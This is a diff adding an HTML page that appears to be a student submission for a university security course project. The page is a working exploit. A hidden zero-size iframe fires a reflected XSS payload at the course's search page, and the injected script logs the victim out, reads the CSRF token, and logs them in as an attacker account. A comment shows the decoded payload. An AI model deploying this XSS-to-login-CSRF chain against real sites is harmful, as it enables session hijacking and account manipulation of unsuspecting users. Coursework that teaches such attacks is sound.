@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<!-- Submission for ECEN5032 Project 2 part 2.1 -->
+<!-- Ben Heberlein and Jeff Venicx -->
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
+       
+        <!-- iframe with XSS CSRF attack - finds CSRF token and makes a login request with it -->
+        <iframe name="csrfFrame" src="http://ecen5032.org/project2/search?q=%3E%3Cscript%3E%24.post%28%22%2Fproject2%2Flogout%22%2C+function%28%29%7B%7D%29%3B%24%28%22.main%22%29.load%28%22%2Fproject2%2F%22%2C+function%28data%29+%7B+var+csrf+%3D+%24%28%22input%5Bname%3Dcsrf_token%5D%22%29.val%28%29%3B++%24.post%28%22%2Fproject2%2Flogin%22%2C+%7Bcsrf_token%3Acsrf%2Cusername%3A%22attacker%22%2Cpassword%3A%22l33th4x%22%7D%2Cfunction%28%29+%7B%7D%29%7D%29%3C%2Fscript%3E%3C" width="0" height="0" border="0" style="display:none;"></iframe>
+
+        <!-- payload translated -->
+        <!-- 
+            ><script>$.post("/project2/logout", function(){});$(".main").load("/project2/", function(data) { var csrf = $("input[name=csrf_token]").val();  $.post("/project2/login", {csrf_token:csrf,username:"attacker",password:"l33th4x"},function() {})})</script>< 
+            -->
+    </body>
+</html>
